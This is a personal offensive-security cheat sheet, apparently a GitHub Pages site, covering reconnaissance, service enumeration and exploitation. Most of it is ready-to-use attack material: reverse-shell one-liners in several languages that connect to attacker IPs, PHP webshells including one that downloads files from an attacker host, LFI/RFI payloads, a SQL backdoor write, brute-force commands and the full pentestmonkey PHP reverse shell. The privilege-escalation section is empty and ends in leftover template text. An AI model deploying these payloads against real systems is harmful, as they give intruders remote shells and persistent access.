# a no-bullshit offsec guide 

### disclaimer:
The information on this website is for educational purposes only. The author of this work will not be held accountable for any use or misuse of the information on this website. As there is always some risk involved, the author is not responsible for any effects or consequences from the use of any suggestions, recommendations, or procedures described herein. 


## dump windows 
 

- linux is open source, that means you have millions of lines of code at your disposal for free.

- modular applications and libraries in linux 

- super fast boot time

- no annoying updates 

- lightening fast on low ram

- free

- portable, yes even on a usb

- secure

- most tools are written in linux

- most web servers run in linux due to its stability


- easier to use than mainstream opinion


i use kali linux by offensive security. you can either use it on a virtualization software like virtualbox/vmware or use it as a partition along with your host os.

[1. installation guide for virtualization](https://phoenixnap.com/kb/how-to-install-kali-linux-on-virtualbox)

[2. installation guide for main os](https://techsprobe.com/how-to-install-kali-linux-2020-on-a-laptop-pc/)

## secure your kali installation

- change your default root password

- change your default ssh keys

- add an unprivileged user to work on, give it sudo rights with a password

- change your mac address with macchanger

- install tor and proxychains

- install anonsurf

- check open ports on your localhost (sudo ss -tulwn)

- close unnecessary ports/services (sudo service <service name> stop)


[1. guide to secure kali](https://alphacybersecurity.tech/how-to-secure-your-kali-linux-machine/)

[2. guide to secure kali further](https://thehacktoday.com/how-to-protect-yourself-while-hacking-in-kali-linux/)




**## the methodology i follow**


**- initial scoping**

**- recon **

**- enumerate -> exploit**

**- reverse shell**

**- upgrade shell**

**- enumerate the target**

**- escalate privileges**

**- gain root access**

**- write a report**


## scoping
clearly understand which targets your have permission to scan/attack, do not break the law as it would hamper your reputation as a security researcher

## recon

recon wide to gather information on as many potential attack surfaces as possible

### 1. masscan

fast full port scanner
```
masscan -i tun0 -p1-65535 --rate=1000 IP
```
  
### 2. nmap

this handy little tool lets you see which ports are open on the target along with other information about the target

```
nmap -sTV -v -p- IP
sudo nmap -sU -v IP

 ``` 
 
 ### 3. nmapAutomater
 
a useful script to automate the scanning process

```
 ./nmapAutomater.sh IP All
 ./nmapAutomater.sh IP Vulns
 ./nmapAutomater.sh IP Quick
 ./nmapAutomater.sh IP Full
```

shoutout to @21y4d for this

[check it out on github here](https://github.com/21y4d/nmapAutomator/blob/master/nmapAutomator.sh)

## enumerate -> exploit

upgrade searchsploit 

```
searchsploit -u
searchsploit <service>

google site:exploitdb <service version>
google service version exploit
```

### 1. HTTP  80, 8000, 8080

```
nikto -h IP
curl -i http(s)://IP/robots.txt
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://<IP>/FUZZ.txt" -t 100
wfuzz -c -z range, 1-65535 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.18 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid" -V
```

- fire up dirbuster with a medium wordlist

- browse the site with a burpsuite proxy running

- look for SQL injection parameters in GET/POST

- LFI with ?file=foo parameter

- /etc/passwd /etc/shadow

- /var/www/html/config.php

- ?page=php://filter/convert.base64-encode/resource=../config.php

- ../../../../../boot.ini for version
- http://target.com/?page=./../../../../../../../../../etc/passwd%00

- RFI backdoor

- access backdoor with http://IP/inc.php?inc=http://YOURIP/bd.php

- phpinfo()

- password bruteforce

```
- <?php include $_GET['inc']; ?>
```



### 2. HTTPS 443

```
sslscan https://192.168.1.10/
```
- check out potential usernames in the ssl cert and the correct vhost
- look for heartbleed vuln

### 3. FTP 21 TFTP UDP 69

```
ftp IP
anonymous:anonymous
nmap --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-anon,ftp-libopie,,ftp-vuln-cve2010-4221,tftp-enum -p 21 -n -v -sV -Pn IP

```
- anonymous login
- vulns in version
- traverse filesystem look for password files, system configs, BOF targets, OS version
- check upload potential



### 4. SMB 139,445

```
enum4linux -a IP
smbclient -L IP
locate *.nse | grep smb
nmap -p 139,445 --script=$scriptname IP
nmap -p 139,445 --script=smb-vuln* IP -v
enum4linux -a $targetip
enum4linux -a $targetip
smbmap -H $targetip
smbclient \\\\IP\\tmp
rpcclient -U "" -N 10.10.10.3
mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//IP/My Share" /mnt/cifs
smbmap -H IP -u tyler -p '92g!mA8BGjOirkL%OG*&'
nbtscan -r IP/24
sudo nmap -n -v -sV -Pn -p 445 --script=smb-ls,smb-mbenum,smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smb-vuln* IP
psexec to login to samba
smbclient -L 192.168.1.10
smbclient \\IP\ipc$ -U administrator
smbclient //IP/ipc$ -U administrator
smbclient //IP/admin$ -U administrator

```
-check if exploitable by msf


### 4. SNMP UDP 161

```
snmp-check
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254);do echo 10.11.1.$ip;done > ips
onesixtyone -c community -i ips
snmpwalk -c public -v1 IP
snmpwalk -c public -v1 IP 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 IP 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.6.3.1.2
```

### 5. SSH 22

-usually a secondary access point

### 6. SMTP/Email 25, 110/995 or 143/993

```
nmap --script=smtp-enum-users,smtp-commands,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764,smtp-vuln-cve2010-4344 -p 25 -n -v -sV -Pn IP

telnet IP 110
USER user
PASS pass

LIST
RETR message number
QUIT
```
- useful for enumerating users
- check versions and use searchsploit



### 7. LDAP 389

```
ldapsearch -x -h IP -p389 -s base namingcontexts
nmap -p 389 --script ldap-search IP
```

### 8. DNS 53

modify /etc/hosts file for individual dns resolution
modify /etc/resolv.conf for nameserver resolution overall
```
nslookup
SERVER <ip>
<ip>

dig axfr subdomain @IP
```


### 9. RPC 135

-metasploit exploit for ms-rpc: exploit/windows/dcerpc/ms05_017_msmq
```
nmap -n -v -sV -Pn -p 135 --script=msrpc-enum IP 
```


### 10. MySQL 3306

```
nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 IP

mysql --host=IP -u root -p
```

## reverse shell

- creating a php backdoor shell

```
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=4444 -f raw
```

- bash 

```
bash -i >& /dev/tcp/10.10.14.40/4444 0>&1
```

- perl

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

- python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- php

```
php -r '$sock=fsockopen("10.10.14.42",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

- php rce

```
<?php echo system($_REQUEST['zu']); ?>
```

- php one liner

```
<?php exec("/bin/bash -c ‘bash -i >& /dev/tcp/10.10.14.40/4444 0>&1’"); ?>
```

- php webshell one liner

```
<?php system($_REQUEST['cmd']); ?>
```

- php webshell for windows, upload and execute

```
<?php
  if (isset($_REQUEST['fupload'])) {
    file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.42:8000/" . $_REQUEST['fupload']));
  };

  if (isset($_REQUEST['fexec'])) {
    echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
  };
?>
EOF;
```

- phpadmin shell

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```

- ruby

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

- netcat

```
nc -e /bin/sh 10.0.0.1 1234
```

- netcat for outdated systems

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 4444 >/tmp/f
```

- netcat for windows

```
nc64.exe 10.10.14.42 4444 -e cmd.exe
```

- java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f war > zuk3y.war
```
- SUID C Shell

```
int main(void){

setresuid(0, 0, 0);

system("/bin/bash");

}
```

- iis aspx reverse shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```

- php web shell
shoutout to www.pentestmonkey.net
```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.23';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

## upgrading shell 

- upgrade reverse shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
```
- find your own term value: ```echo $TERM```
- export your term value```export TERM=<your own term value>```
- ctrl+z to background the shell
- enable passing keyboard shorcuts```stty raw -echo```
- foreground the process:```fg```
- reset ```reset```

## privilege escalation











### Markdown

Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for

```markdown
Syntax highlighted code block

# Header 1
## Header 2
### Header 3

- Bulleted
- List

1. Numbered
2. List

**Bold** and _Italic_ and `Code` text

[Link](url) and ![Image](src)
```
